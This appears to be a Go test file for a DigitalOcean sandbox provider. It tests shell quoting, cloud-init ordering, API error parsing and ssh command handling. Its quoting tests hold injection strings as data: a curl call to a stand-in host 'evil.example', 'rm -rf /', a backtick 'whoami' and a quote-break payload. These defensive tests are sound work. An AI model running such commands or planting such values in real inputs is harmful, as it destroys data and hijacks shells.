package digitalocean

import (
	"strings"
	"testing"
	"time"
)

// Environment values are user-supplied and land in a root shell during
// cloud-init, so an unquoted value would be command injection into the
// sandbox's own bootstrap.
func TestShellQuoteNeutralisesInjection(t *testing.T) {
	cases := []struct {
		name  string
		value string
	}{
		{"command substitution", "TOKEN=$(curl evil.example)"},
		{"statement separator", "A=b; rm -rf /"},
		{"backtick", "A=`whoami`"},
		{"embedded single quote", "A=it's"},
		{"quote break attempt", `A=x' ; rm -rf / ; echo '`},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			quoted := shellQuote(testCase.value)

			if !strings.HasPrefix(quoted, "'") || !strings.HasSuffix(quoted, "'") {
				t.Fatalf("value is not wrapped in single quotes: %s", quoted)
			}
			// Every interior quote must be escaped, so the string cannot be
			// terminated early. Strip the escaped form and no bare quote is left.
			interior := strings.TrimSuffix(strings.TrimPrefix(quoted, "'"), "'")
			if strings.Contains(strings.ReplaceAll(interior, `'\''`, ""), "'") {
				t.Errorf("unescaped quote survives in %s", quoted)
			}
		})
	}
}

func TestIdentifierFromTagsPrefersTag(t *testing.T) {
	tags := []string{tagManaged, tagPrefixID + "abc123", tagPrefixTTL + "1700000000"}
	if got := identifierFromTags(tags, "sbx-wrongname"); got != "abc123" {
		t.Errorf("identifier = %q, want abc123", got)
	}
}

// Reconciliation must still recognise a droplet whose tags were stripped, or
// a half-created sandbox becomes invisible and bills forever.
func TestIdentifierFromTagsFallsBackToName(t *testing.T) {
	if got := identifierFromTags(nil, "sbx-fallback"); got != "fallback" {
		t.Errorf("identifier = %q, want fallback", got)
	}
}

func TestExpiryFromTags(t *testing.T) {
	expires, found := expiryFromTags([]string{tagManaged, tagPrefixTTL + "1700000000"})
	if !found {
		t.Fatal("expected an expiry tag to be found")
	}
	if !expires.Equal(time.Unix(1700000000, 0).UTC()) {
		t.Errorf("expiry = %s", expires)
	}
}

func TestExpiryFromTagsIgnoresGarbage(t *testing.T) {
	if _, found := expiryFromTags([]string{tagPrefixTTL + "not-a-number"}); found {
		t.Error("a malformed expiry tag should not parse")
	}
}

func TestPublicAddressSkipsPrivateNetworks(t *testing.T) {
	var instance droplet
	instance.Networks.V4 = []struct {
		Address string `json:"ip_address"`
		Type    string `json:"type"`
	}{
		{Address: "10.0.0.5", Type: "private"},
		{Address: "203.0.113.7", Type: "public"},
	}
	if got := instance.publicAddress(); got != "203.0.113.7" {
		t.Errorf("publicAddress = %q, want the public one", got)
	}
}

// cloud-init must mark readiness only after the image is pulled and the
// container is running. A droplet reporting active says nothing about that.
func TestCloudInitSignalsReadinessAfterContainerStarts(t *testing.T) {
	var rendered strings.Builder
	err := cloudInit.Execute(&rendered, struct {
		Image         string
		Container     string
		Environment   []string
		ExpirySeconds int
	}{Image: "ghcr.io/example/base:tag", Container: containerName, ExpirySeconds: 1800})
	if err != nil {
		t.Fatalf("cloudInit: %v", err)
	}

	script := rendered.String()
	pull := strings.Index(script, "docker pull")
	ready := strings.Index(script, "touch /run/sbx-ready")
	if pull == -1 || ready == -1 {
		t.Fatalf("cloud-init missing pull or readiness marker:\n%s", script)
	}
	if ready < pull {
		t.Error("readiness marker is written before the image is pulled")
	}
	if !strings.Contains(script, "--on-active=1800s") {
		t.Error("expiry backstop not wired to the TTL")
	}
}

// doctl prints API failures as JSON on stdout and leaves stderr empty, so an
// error assembled from stderr alone reported nothing at all — a 422 surfaced
// as a bare "exit status 1".
func TestAPIErrorDetailExtractsMessageFromStdout(t *testing.T) {
	payload := []byte(`{"errors":[{"detail":"POST https://api.digitalocean.com/v2/droplets: 422 Cannot create a droplet with a smaller disk than the image."}]}`)
	detail := apiErrorDetail(payload)
	if !strings.Contains(detail, "smaller disk than the image") {
		t.Errorf("detail = %q, want the 422 message", detail)
	}
}

func TestAPIErrorDetailJoinsMultiple(t *testing.T) {
	payload := []byte(`{"errors":[{"detail":"first"},{"detail":"second"}]}`)
	if got := apiErrorDetail(payload); got != "first; second" {
		t.Errorf("detail = %q, want \"first; second\"", got)
	}
}

func TestAPIErrorDetailIgnoresNonErrorPayloads(t *testing.T) {
	for _, payload := range []string{`[{"id":1,"name":"sbx-abc"}]`, `null`, ``, `not json`} {
		if got := apiErrorDetail([]byte(payload)); got != "" {
			t.Errorf("payload %q produced spurious detail %q", payload, got)
		}
	}
}

// The Docker marketplace image reports min_disk_size 25, and DigitalOcean
// rejects a droplet whose disk is smaller than its image with a 422 rather
// than degrading. The cheapest slug on the account has a 10GB disk, so
// offering it would make `size = "small"` fail every time.
func TestNoSizeMapsToASlugBelowTheImageMinimumDisk(t *testing.T) {
	tooSmall := map[string]int{
		"s-1vcpu-512mb-10gb": 10,
	}
	for spec, slug := range sizeBySpec {
		if disk, known := tooSmall[slug]; known && disk < imageMinimumDisk {
			t.Errorf("size %q maps to %s with a %dGB disk, below the image minimum of %dGB",
				spec, slug, disk, imageMinimumDisk)
		}
	}
	for _, spec := range []string{"small", "standard", "large"} {
		if _, found := sizeBySpec[spec]; !found {
			t.Errorf("size %q is not mapped", spec)
		}
	}
}

// ssh concatenates its trailing arguments and hands the result to a remote
// shell, so passing a command word-by-word loses all quoting. `bash -c "a; b"`
// arrived as `bash -c a; b`, which ran `b` on the droplet host rather than
// inside the sandbox — the container's jq 1.7.1 silently became the host's 1.6.
func TestRemoteCommandKeepsCompoundCommandsIntact(t *testing.T) {
	rendered := remoteCommand([]string{"docker", "exec", "sbx", "bash", "-c", "node --version; jq --version"})

	// The compound script must survive as a single quoted argument.
	if !strings.Contains(rendered, `'node --version; jq --version'`) {
		t.Errorf("compound command was not kept as one argument: %s", rendered)
	}
	// A bare semicolon outside the quoted script would let the host shell run
	// the second half itself.
	beforeScript, _, _ := strings.Cut(rendered, `'node`)
	if strings.Contains(beforeScript, ";") {
		t.Errorf("unquoted separator leaks to the host shell: %s", rendered)
	}
}

func TestRemoteCommandQuotesEveryWord(t *testing.T) {
	rendered := remoteCommand([]string{"docker", "exec", "sbx", "echo", "hello world"})
	if !strings.Contains(rendered, `'hello world'`) {
		t.Errorf("argument with a space was not quoted: %s", rendered)
	}
	if strings.Contains(rendered, "echo hello world") {
		t.Errorf("word boundaries were lost: %s", rendered)
	}
}

func TestRemoteCommandNeutralisesHostEscape(t *testing.T) {
	rendered := remoteCommand([]string{"bash", "-c", "true; touch /tmp/escaped"})
	if strings.Contains(rendered, "; touch /tmp/escaped") &&
		!strings.Contains(rendered, `'true; touch /tmp/escaped'`) {
		t.Errorf("command could execute on the host: %s", rendered)
	}
}

// Every exec opening a fresh TCP connection trips `ufw 22/tcp LIMIT` after six
// connections in thirty seconds, so an agent running a handful of commands
// locks itself out of its own sandbox.
func TestSSHOptionsMultiplexConnections(t *testing.T) {
	for _, required := range []string{"ControlMaster=auto", "ControlPersist"} {
		if !strings.Contains(sshOptions, required) {
			t.Errorf("ssh options missing %s: %s", required, sshOptions)
		}
	}
	arguments := sshArguments("203.0.113.7")
	joined := strings.Join(arguments, " ")
	if !strings.Contains(joined, "ControlPath=") {
		t.Errorf("no ControlPath supplied: %s", joined)
	}
	if arguments[len(arguments)-1] != "root@203.0.113.7" {
		t.Errorf("destination must come last, got %q", arguments[len(arguments)-1])
	}
}
